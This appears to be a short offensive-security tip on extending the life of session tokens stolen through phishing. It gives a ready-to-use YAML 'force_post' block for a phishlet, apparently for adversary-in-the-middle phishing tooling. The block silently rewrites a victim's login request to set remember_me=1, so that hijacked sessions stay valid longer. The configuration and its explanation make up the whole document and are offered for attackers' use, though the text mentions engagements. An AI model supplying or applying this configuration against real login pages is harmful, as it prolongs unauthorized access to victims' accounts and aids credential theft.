Sometimes, in authentication systems, we find a **"Stay logged in"** button. When a user activates it, their session remains open longer, even after closing the browser.

On the other hand, if this **"Stay logged in"** button is not activated, the session may expire quickly (just a few minutes).

This poses a problem for an attacker: when performing a **phishing** attack and obtaining a user's credentials or session **tokens**, these tokens are only valid for a short period. This limits the time during which they can exploit the account.

This is not ideal for an attacker, especially during an **engagement**.

**The goal would therefore be to force the victim to check the "Stay logged in" button**, in order to have a longer and exploitable session.

**How to do it?**

> This can be done by forcing, injecting/modifying the `remember_me=true` parameter (or equivalent) in the POST request sent during login, even if the user did not check it manually.

For this, add this to your phishlet

```yaml
force_post:
  path: '/api/v1/auth/login' # can change
  search:
    - {key: 'email', search: '.*'} # can change
    - {key: 'password', search: '.*'} # can change
  force:
    - {key: 'remember_me', value: '1'} # can change
  type: 'post'
```
